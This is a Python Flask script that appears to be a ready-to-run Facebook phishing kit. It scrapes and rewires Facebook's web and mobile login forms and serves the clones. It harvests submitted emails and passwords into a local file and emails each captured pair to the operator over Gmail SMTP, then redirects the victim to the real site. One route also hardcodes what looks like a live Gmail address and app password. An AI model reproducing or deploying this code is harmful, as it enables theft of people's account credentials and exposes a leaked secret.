import requests
from flask import Flask, render_template, request, redirect
import json
import os
from bs4 import BeautifulSoup
import logging
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Suppress Flask's default logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Flask setup
app = Flask(__name__, template_folder='html')

# Email alert function
def send_secure_email(sender_email, receiver_email, subject, body, smtp_server="smtp.gmail.com", port=465, app_password="your-app-password"):
    """
    Send a secure email using SSL encryption.

    Parameters:
        sender_email (str): Sender's email address.
        receiver_email (str): Recipient's email address.
        subject (str): Subject of the email.
        body (str): Body of the email.
        smtp_server (str): SMTP server address (default: "smtp.gmail.com").
        port (int): Port number for SSL connection (default: 465).
        app_password (str): App Password for Gmail account.
    """
    try:
        # Set up the MIME message
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject
        message.attach(MIMEText(body, "plain"))

        # Create a secure SSL context
        context = ssl.create_default_context()

        # Establish a connection with the SMTP server
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, app_password)  # Authenticate with the app password
            server.sendmail(sender_email, receiver_email, message.as_string())  # Send the email
        print("Email sent securely using SSL!")
    except smtplib.SMTPException as e:
        print(f"Error: Unable to send email. {e}")

# HTML scraping function
def getHTML(page):
    headers = {'Accept-Language': 'en-US,en;q=0.5'}
    web_link = 'https://www.facebook.com/'
    mobile_link = 'https://m.facebook.com'

    try:
        if page == 'web':
            response = requests.get(web_link, headers=headers).text
            soup = BeautifulSoup(response, 'html.parser')

            login_form = soup.find('form', {'id': 'login_form'})
            if login_form:
                login_form['action'] = ''
                for attr in ['novalidate', 'onsubmit', 'data-testid']:
                    if attr in login_form.attrs:
                        del login_form[attr]

                email = login_form.find('input', {'id': 'email'})
                psswrd = login_form.find('input', {'id': 'pass'})
                if email:
                    email['value'] = "{{request.form.username}}"
                if psswrd:
                    psswrd['value'] = "{{request.form.password}}"

                with open('fb.html', 'w', encoding='utf-8') as f:
                    f.write(soup.prettify())

        elif page == 'mobile':
            response = requests.get(mobile_link, headers=headers).text
            soup = BeautifulSoup(response, 'html.parser')

            login_form = soup.find('form', {'id': 'login_form'})
            if login_form:
                del login_form['action']
                del login_form['novalidate']

                with open('mobile.html', 'w', encoding='utf-8') as f:
                    f.write(soup.prettify())

        else:
            print("Invalid page type specified.")

    except Exception as e:
        print("Error occurred:", e)

@app.route('/', methods=['GET', 'POST'])
def homepage():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['pass']

        # Log and save credentials
        print(f"email: {email}, password: {password}")
        os.makedirs('credentials', exist_ok=True)
        with open('credentials/harvester.txt', 'a', encoding='utf-8') as f:
            f.write(json.dumps({'email': email, 'password': password}, indent=4) + "\n")

        # Send email alert
        send_secure_email(
            sender_email="your-email@gmail.com",  # Replace with your Gmail
            receiver_email="your-email@gmail.com",  # Replace with the recipient email
            subject="Credential Captured",
            body=f"Email: {email}\nPassword: {password}",
            app_password="your-app-password"  # Replace with your Gmail App Password
        )

        return redirect('https://www.facebook.com')

    if request.method == 'GET':
        print('[*] User Connected Through Web...')
        return render_template("fb.html")

@app.route('/mob', methods=['GET', 'POST'])
def mobpage():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['pass']

        # Log and save credentials
        print(f"email: {email}, password: {password}")
        os.makedirs('credentials', exist_ok=True)
        with open('credentials/harvester.txt', 'a', encoding='utf-8') as f:
            f.write(json.dumps({'email': email, 'password': password}, indent=4) + "\n")

        # Send email alert
        send_secure_email(
            sender_email="jafferali.0741@gmail.com",  # Replace with your Gmail
            receiver_email="your-email@gmail.com",  # Replace with the recipient email
            subject="Credential Captured",
            body=f"Email: {email}\nPassword: {password}",
            app_password="xnxo dxxa qukg mpsl"  # Replace with your Gmail App Password
        )

        return redirect('https://m.facebook.com')

    if request.method == 'GET':
        print('[*] User Connected Through Mobile...')
        return render_template("mobile.html")

if __name__ == '__main__':
    if not os.path.exists('fb.html'):
        print('[*] Getting Web HTML File...')
        getHTML(page='web')

    if not os.path.exists('mobile.html'):
        print('[*] Getting Mobile HTML File...')
        getHTML(page='mobile')

    else:
        print('[*] Files Already Present...')

    print('[*] You will be notified in console as soon as a user connects whether through mobile or web. '
          '\n    Username and Password will be displayed in-console when user submits it as well as will be saved '
          'in harvester.txt in credentials folder.\n    Started At Address : 192.168.83.219\n')

    app.run(host='127.0.0.1', port=5000, debug=True)
